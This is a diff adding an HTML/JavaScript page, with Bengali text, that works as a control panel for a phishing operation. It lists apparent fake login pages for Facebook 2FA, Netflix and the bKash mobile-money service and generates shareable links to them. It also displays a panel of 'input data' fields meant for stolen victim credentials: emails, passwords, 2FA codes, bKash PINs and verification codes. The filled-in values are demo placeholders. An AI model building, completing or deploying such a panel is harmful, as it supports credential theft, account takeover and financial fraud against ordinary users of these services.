@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTML ফাইল ম্যানেজার</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background-color: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            overflow: hidden;
+        }
+        
+        header {
+            background: linear-gradient(135deg, #4a5568 0%, #2d3748 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+        
+        .main-content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            padding: 30px;
+        }
+        
+        @media (max-width: 768px) {
+            .main-content {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .option-section {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .option-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #e2e8f0;
+        }
+        
+        .option-icon {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            color: white;
+            font-size: 1.5rem;
+        }
+        
+        .option-title {
+            font-size: 1.5rem;
+            color: #4a5568;
+        }
+        
+        .file-list {
+            list-style: none;
+            margin-bottom: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .file-item {
+            background: white;
+            margin-bottom: 10px;
+            padding: 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border-left: 4px solid #667eea;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .file-item:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border-left-color: #764ba2;
+        }
+        
+        .file-item.active {
+            background: #e6fffa;
+            border-left-color: #38b2ac;
+        }
+        
+        .file-name {
+            font-weight: 600;
+        }
+        
+        .file-size {
+            font-size: 0.8rem;
+            color: #718096;
+        }
+        
+        .link-section {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 0 30px 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        h2 {
+            color: #4a5568;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #e2e8f0;
+            text-align: center;
+        }
+        
+        .link-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .link-container {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .link-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .link-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #4a5568;
+        }
+        
+        .link-display {
+            background: #edf2f7;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 0.9rem;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: inline-block;
+            text-decoration: none;
+            margin: 5px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-secondary {
+            background: #e2e8f0;
+            color: #4a5568;
+        }
+        
+        .btn-secondary:hover {
+            box-shadow: 0 5px 15px rgba(113, 128, 150, 0.4);
+        }
+        
+        .data-section {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 25px;
+            margin: 0 30px 30px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .data-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        @media (max-width: 768px) {
+            .data-container {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        .data-box {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.05);
+        }
+        
+        .data-title {
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #4a5568;
+            text-align: center;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .data-content {
+            min-height: 150px;
+            max-height: 300px;
+            overflow-y: auto;
+            padding: 10px;
+            background: #f7fafc;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+        
+        .empty-data {
+            color: #718096;
+            font-style: italic;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .data-item {
+            padding: 8px;
+            border-bottom: 1px solid #e2e8f0;
+            display: flex;
+            justify-content: space-between;
+        }
+        
+        .data-item:last-child {
+            border-bottom: none;
+        }
+        
+        .data-key {
+            font-weight: 600;
+            color: #4a5568;
+        }
+        
+        .data-value {
+            color: #2d3748;
+            word-break: break-all;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            color: #718096;
+            font-size: 0.9rem;
+            border-top: 1px solid #e2e8f0;
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 20px;
+            color: #718096;
+            font-style: italic;
+        }
+        
+        .refresh-btn {
+            background: #48bb78;
+            margin-top: 10px;
+        }
+        
+        .refresh-btn:hover {
+            box-shadow: 0 5px 15px rgba(72, 187, 120, 0.4);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>HTML ফাইল ম্যানেজার</h1>
+            <p class="subtitle">দুইটি অপশন থেকে ফাইল নির্বাচন করুন এবং ইনপুট ডেটা দেখুন</p>
+        </header>
+        
+        <div class="main-content">
+            <div class="option-section">
+                <div class="option-header">
+                    <div class="option-icon">1</div>
+                    <div class="option-title">সোশ্যাল মিডিয়া</div>
+                </div>
+                <ul class="file-list" id="fileList1">
+                    <!-- অপশন ১ এর ফাইল লিস্ট -->
+                </ul>
+                <button class="btn" onclick="selectOption(1)">এই অপশন নির্বাচন করুন</button>
+            </div>
+            
+            <div class="option-section">
+                <div class="option-header">
+                    <div class="option-icon">2</div>
+                    <div class="option-title">ফিনান্সিয়াল সার্ভিস</div>
+                </div>
+                <ul class="file-list" id="fileList2">
+                    <!-- অপশন ২ এর ফাইল লিস্ট -->
+                </ul>
+                <button class="btn" onclick="selectOption(2)">এই অপশন নির্বাচন করুন</button>
+            </div>
+        </div>
+        
+        <div class="link-section">
+            <h2>লিঙ্ক তৈরি করুন</h2>
+            <div class="link-container">
+                <div class="link-box">
+                    <div class="link-title">অপশন ১ নির্বাচিত ফাইল</div>
+                    <div class="link-display" id="linkDisplay1">
+                        কোন ফাইল নির্বাচন করা হয়নি
+                    </div>
+                    <button class="btn" onclick="generateLink(1)">লিঙ্ক তৈরি করুন</button>
+                    <a href="#" class="btn btn-secondary" id="visitLinkBtn1" target="_blank" style="display: none;">লিঙ্ক ভিজিট করুন</a>
+                </div>
+                
+                <div class="link-box">
+                    <div class="link-title">অপশন ২ নির্বাচিত ফাইল</div>
+                    <div class="link-display" id="linkDisplay2">
+                        কোন ফাইল নির্বাচন করা হয়নি
+                    </div>
+                    <button class="btn" onclick="generateLink(2)">লিঙ্ক তৈরি করুন</button>
+                    <a href="#" class="btn btn-secondary" id="visitLinkBtn2" target="_blank" style="display: none;">লিঙ্ক ভিজিট করুন</a>
+                </div>
+            </div>
+        </div>
+        
+        <div class="data-section">
+            <h2>ইনপুট ডেটা</h2>
+            <button class="btn refresh-btn" onclick="loadInputData()">ডেটা রিফ্রেশ করুন</button>
+            <div class="data-container">
+                <div class="data-box">
+                    <div class="data-title">অপশন ১ ইনপুট ডেটা</div>
+                    <div class="data-content" id="dataContent1">
+                        <div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>
+                    </div>
+                </div>
+                
+                <div class="data-box">
+                    <div class="data-title">অপশন ২ ইনপুট ডেটা</div>
+                    <div class="data-content" id="dataContent2">
+                        <div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2024 HTML ফাইল ম্যানেজার | GitHub এ আপলোডকৃত ফাইলসমূহ</p>
+        </footer>
+    </div>
+
+    <script>
+        // ফাইল ডেটা
+        const files = {
+            option1: [
+                { name: "facebook-2FA.html", size: "8.2 KB", url: "facebook-2FA.html", dataKey: "facebookData" },
+                { name: "Netflix.html", size: "15.7 KB", url: "Netflix.html", dataKey: "netflixData" }
+            ],
+            option2: [
+                { name: "bKash.html", size: "12.5 KB", url: "bKash.html", dataKey: "bkashData" }
+            ]
+        };
+        
+        // নির্বাচিত ফাইল ট্র্যাক করা
+        let selectedFiles = {
+            option1: null,
+            option2: null
+        };
+        
+        let activeOption = null;
+        
+        // DOM এলিমেন্ট
+        const fileList1 = document.getElementById('fileList1');
+        const fileList2 = document.getElementById('fileList2');
+        const linkDisplay1 = document.getElementById('linkDisplay1');
+        const linkDisplay2 = document.getElementById('linkDisplay2');
+        const visitLinkBtn1 = document.getElementById('visitLinkBtn1');
+        const visitLinkBtn2 = document.getElementById('visitLinkBtn2');
+        const dataContent1 = document.getElementById('dataContent1');
+        const dataContent2 = document.getElementById('dataContent2');
+        
+        // অপশন নির্বাচন
+        function selectOption(optionNumber) {
+            activeOption = optionNumber;
+            alert(`অপশন ${optionNumber} নির্বাচন করা হয়েছে`);
+        }
+        
+        // ফাইল লিস্ট তৈরি
+        function renderFileLists() {
+            // অপশন ১ এর ফাইল লিস্ট
+            fileList1.innerHTML = '';
+            if (files.option1.length === 0) {
+                fileList1.innerHTML = '<div class="empty-state">কোন ফাইল পাওয়া যায়নি</div>';
+            } else {
+                files.option1.forEach(file => {
+                    const li = document.createElement('li');
+                    li.className = `file-item ${selectedFiles.option1 === file ? 'active' : ''}`;
+                    li.innerHTML = `
+                        <div>
+                            <div class="file-name">${file.name}</div>
+                            <div class="file-size">${file.size}</div>
+                        </div>
+                        <div class="file-select">${selectedFiles.option1 === file ? '✓ নির্বাচিত' : 'নির্বাচন করুন'}</div>
+                    `;
+                    
+                    li.addEventListener('click', () => {
+                        selectFile(1, file);
+                    });
+                    
+                    fileList1.appendChild(li);
+                });
+            }
+            
+            // অপশন ২ এর ফাইল লিস্ট
+            fileList2.innerHTML = '';
+            if (files.option2.length === 0) {
+                fileList2.innerHTML = '<div class="empty-state">কোন ফাইল পাওয়া যায়নি</div>';
+            } else {
+                files.option2.forEach(file => {
+                    const li = document.createElement('li');
+                    li.className = `file-item ${selectedFiles.option2 === file ? 'active' : ''}`;
+                    li.innerHTML = `
+                        <div>
+                            <div class="file-name">${file.name}</div>
+                            <div class="file-size">${file.size}</div>
+                        </div>
+                        <div class="file-select">${selectedFiles.option2 === file ? '✓ নির্বাচিত' : 'নির্বাচন করুন'}</div>
+                    `;
+                    
+                    li.addEventListener('click', () => {
+                        selectFile(2, file);
+                    });
+                    
+                    fileList2.appendChild(li);
+                });
+            }
+        }
+        
+        // ফাইল নির্বাচন
+        function selectFile(optionNumber, file) {
+            selectedFiles[`option${optionNumber}`] = file;
+            renderFileLists();
+            
+            // লিঙ্ক বাটন লুকানো
+            if (optionNumber === 1) {
+                visitLinkBtn1.style.display = 'none';
+                linkDisplay1.textContent = 'লিঙ্ক তৈরি করতে বাটনে ক্লিক করুন';
+            } else {
+                visitLinkBtn2.style.display = 'none';
+                linkDisplay2.textContent = 'লিঙ্ক তৈরি করতে বাটনে ক্লিক করুন';
+            }
+        }
+        
+        // লিঙ্ক তৈরি
+        function generateLink(optionNumber) {
+            const selectedFile = selectedFiles[`option${optionNumber}`];
+            
+            if (!selectedFile) {
+                alert(`দয়া করে অপশন ${optionNumber} থেকে একটি ফাইল নির্বাচন করুন`);
+                return;
+            }
+            
+            // বর্তমান URL বেস তৈরি করা
+            const baseUrl = window.location.href.split('/').slice(0, -1).join('/');
+            const fileUrl = selectedFile.url;
+            
+            // সম্পূর্ণ URL তৈরি
+            const fullUrl = `${baseUrl}/${fileUrl}`;
+            
+            // লিঙ্ক দেখানো
+            if (optionNumber === 1) {
+                linkDisplay1.textContent = fullUrl;
+                visitLinkBtn1.href = fileUrl;
+                visitLinkBtn1.style.display = 'inline-block';
+            } else {
+                linkDisplay2.textContent = fullUrl;
+                visitLinkBtn2.href = fileUrl;
+                visitLinkBtn2.style.display = 'inline-block';
+            }
+        }
+        
+        // ইনপুট ডেটা লোড করা
+        function loadInputData() {
+            // ডেমো ডেটা - বাস্তবে এখানে সার্ভার থেকে ডেটা লোড করবেন
+            const demoData = {
+                facebookData: [
+                    { key: "ইমেইল", value: "user@example.com" },
+                    { key: "পাসওয়ার্ড", value: "••••••••" },
+                    { key: "2FA কোড", value: "123456" },
+                    { key: "ডিভাইস", value: "Windows 10, Chrome" },
+                    { key: "লগইন সময়", value: new Date().toLocaleString() }
+                ],
+                netflixData: [
+                    { key: "ইমেইল", value: "netflixuser@example.com" },
+                    { key: "পাসওয়ার্ড", value: "••••••••" },
+                    { key: "রিমেমবার মি", value: "হ্যাঁ" },
+                    { key: "লগইন সময়", value: new Date().toLocaleString() }
+                ],
+                bkashData: [
+                    { key: "ফোন নম্বর", value: "01XXXXXXXXX" },
+                    { key: "পিন", value: "•••••" },
+                    { key: "ভেরিফিকেশন কোড", value: "654321" },
+                    { key: "ডিভাইস তথ্য", value: "Android, App Version 3.5.2" },
+                    { key: "লেনদেন সময়", value: new Date().toLocaleString() }
+                ]
+            };
+            
+            // অপশন ১ এর ডেটা দেখানো
+            dataContent1.innerHTML = '';
+            files.option1.forEach(file => {
+                const fileData = demoData[file.dataKey];
+                if (fileData) {
+                    const fileHeader = document.createElement('div');
+                    fileHeader.innerHTML = `<strong>${file.name}:</strong>`;
+                    fileHeader.style.marginBottom = '10px';
+                    fileHeader.style.paddingBottom = '5px';
+                    fileHeader.style.borderBottom = '1px solid #e2e8f0';
+                    dataContent1.appendChild(fileHeader);
+                    
+                    fileData.forEach(item => {
+                        const dataItem = document.createElement('div');
+                        dataItem.className = 'data-item';
+                        dataItem.innerHTML = `
+                            <span class="data-key">${item.key}:</span>
+                            <span class="data-value">${item.value}</span>
+                        `;
+                        dataContent1.appendChild(dataItem);
+                    });
+                    
+                    const spacer = document.createElement('div');
+                    spacer.style.marginBottom = '15px';
+                    dataContent1.appendChild(spacer);
+                }
+            });
+            
+            if (dataContent1.children.length === 0) {
+                dataContent1.innerHTML = '<div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>';
+            }
+            
+            // অপশন ২ এর ডেটা দেখানো
+            dataContent2.innerHTML = '';
+            files.option2.forEach(file => {
+                const fileData = demoData[file.dataKey];
+                if (fileData) {
+                    const fileHeader = document.createElement('div');
+                    fileHeader.innerHTML = `<strong>${file.name}:</strong>`;
+                    fileHeader.style.marginBottom = '10px';
+                    fileHeader.style.paddingBottom = '5px';
+                    fileHeader.style.borderBottom = '1px solid #e2e8f0';
+                    dataContent2.appendChild(fileHeader);
+                    
+                    fileData.forEach(item => {
+                        const dataItem = document.createElement('div');
+                        dataItem.className = 'data-item';
+                        dataItem.innerHTML = `
+                            <span class="data-key">${item.key}:</span>
+                            <span class="data-value">${item.value}</span>
+                        `;
+                        dataContent2.appendChild(dataItem);
+                    });
+                    
+                    const spacer = document.createElement('div');
+                    spacer.style.marginBottom = '15px';
+                    dataContent2.appendChild(spacer);
+                }
+            });
+            
+            if (dataContent2.children.length === 0) {
+                dataContent2.innerHTML = '<div class="empty-data">কোন ডেটা পাওয়া যায়নি</div>';
+            }
+            
+            alert('ডেটা সফলভাবে লোড করা হয়েছে!');
+        }
+        
+        // প্রাথমিক রেন্ডার
+        renderFileLists();
+        
+        // ডিফল্ট হিসেবে ফাইল সিলেক্ট করা
+        if (files.option1.length > 0) {
+            selectFile(1, files.option1[0]);
+        }
+        if (files.option2.length > 0) {
+            selectFile(2, files.option2[0]);
+        }
+        
+        // পেজ লোড হলে ডেটা লোড করা
+        window.addEventListener('load', loadInputData);
+    </script>
+</body>
+</html>
